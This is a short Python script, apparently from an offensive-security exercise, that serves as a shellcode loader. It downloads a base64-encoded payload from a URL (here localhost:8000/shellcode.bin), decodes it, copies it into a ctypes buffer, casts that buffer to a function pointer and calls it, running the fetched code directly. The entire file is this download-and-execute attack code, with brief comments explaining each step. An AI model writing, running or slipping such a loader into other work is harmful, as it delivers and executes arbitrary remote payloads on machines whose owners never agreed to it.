# to execute shellcode, need to create a buffer in memory, create a pointer in memory and call the function

import urllib3
import ctypes
import base64

url = "http://localhost:8000/shellcode.bin"
response = urllib3.PoolManager().urlopen(url)

shellcode = base64.b64decode(response.read())

# allocate buffer to hold shellcode after we have decoded it
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# case the buffer to act as a function pointer
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

shellcode_func()